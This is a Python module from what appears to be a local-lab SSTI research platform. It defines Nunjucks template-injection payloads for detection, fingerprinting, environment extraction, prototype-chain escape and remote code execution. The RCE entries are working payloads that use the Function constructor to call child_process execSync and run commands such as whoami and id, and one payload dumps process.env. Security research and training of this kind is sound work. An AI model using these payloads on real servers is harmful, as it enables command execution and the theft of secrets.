"""Nunjucks engine definition for RENDER SSTI research platform."""

from engines.base import TemplateEngine, ProbePayload


class NunjucksEngine(TemplateEngine):
    """Nunjucks template engine attack surface (Node.js)."""

    def __init__(self) -> None:
        super().__init__(
            name="nunjucks",
            language="javascript",
            framework="Node.js/Express",
            default_vulnerable_url="http://127.0.0.1:3003",
            default_hardened_url="http://127.0.0.1:3004",
            detection_probes=[
                ProbePayload(
                    id="njk-detect-001",
                    name="Math Evaluation Probe",
                    stage="detection",
                    payload="{{7*7}}",
                    expected="49",
                    explanation="Nunjucks evaluates math expressions inside {{ }}.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="njk-detect-002",
                    name="String Concatenation Probe",
                    stage="detection",
                    payload="{{'foo' + 'bar'}}",
                    expected="foobar",
                    explanation="Nunjucks evaluates string concatenation.",
                    safety_scope="local_lab_only",
                ),
            ],
            fingerprint_probes=[
                ProbePayload(
                    id="njk-fp-001",
                    name="Range Function",
                    stage="fingerprinting",
                    payload="{{range(0,3)}}",
                    expected="0,1,2",
                    explanation="range() is a Nunjucks built-in not present in Handlebars.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="njk-fp-002",
                    name="Cycler Function",
                    stage="fingerprinting",
                    payload="{{cycler('a','b','c').next()}}",
                    expected="a",
                    explanation="cycler() is a Nunjucks-specific global function.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="njk-fp-003",
                    name="Joiner Function",
                    stage="fingerprinting",
                    payload="{% set j = joiner() %}{{j()}}{{j()}}",
                    expected=",",
                    explanation="joiner() is a Nunjucks-specific helper.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="njk-fp-004",
                    name="Filter abs",
                    stage="fingerprinting",
                    payload="{{-5 | abs}}",
                    expected="5",
                    explanation="abs filter works in Nunjucks (inherits from Jinja2 syntax).",
                    safety_scope="local_lab_only",
                ),
            ],
            extract_payloads=[
                ProbePayload(
                    id="njk-ext-001",
                    name="Global Object Access",
                    stage="extraction",
                    payload="{{global.process.env}}",
                    expected="PATH",
                    explanation="Nunjucks may expose Node.js global in template context.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="njk-ext-002",
                    name="Constructor Keys",
                    stage="extraction",
                    payload="{{''.__proto__.constructor}}",
                    expected="function String",
                    explanation="JavaScript prototype chain access via Nunjucks.",
                    safety_scope="local_lab_only",
                ),
            ],
            escape_payloads=[
                ProbePayload(
                    id="njk-esc-001",
                    name="Prototype Escape via __proto__",
                    stage="escape",
                    payload="{{''.__proto__.__proto__.constructor.name}}",
                    expected="Object",
                    explanation="Walk prototype chain to reach Object constructor.",
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="njk-esc-002",
                    name="Function Constructor",
                    stage="escape",
                    payload="{{''.__proto__.constructor.constructor('return process')()}}",
                    expected="process",
                    explanation="Reach Function constructor from String prototype to evaluate code.",
                    safety_scope="local_lab_only",
                ),
            ],
            rce_payloads=[
                ProbePayload(
                    id="njk-rce-001",
                    name="RCE via Function constructor (whoami)",
                    stage="rce",
                    payload=(
                        "{{''.__proto__.constructor.constructor"
                        "('return require(\"child_process\").execSync(\"whoami\").toString()')()"
                        "}}"
                    ),
                    expected="whoami_output",
                    explanation=(
                        "Chains String.__proto__.constructor (Function) then calls "
                        "require('child_process') to run whoami."
                    ),
                    safety_scope="local_lab_only",
                ),
                ProbePayload(
                    id="njk-rce-002",
                    name="RCE via global process (id)",
                    stage="rce",
                    payload=(
                        "{{range.constructor('return global.process.mainModule"
                        ".require(\"child_process\").execSync(\"id\").toString()')()"
                        "}}"
                    ),
                    expected="uid=",
                    explanation="Uses range.constructor (Function) to call process.mainModule.require.",
                    safety_scope="local_lab_only",
                ),
            ],
        )

    def check_fingerprint(self, response_text: str) -> bool:
        markers = ["0,1,2", "0 1 2", "cycler", "joiner"]
        return any(m in response_text for m in markers)
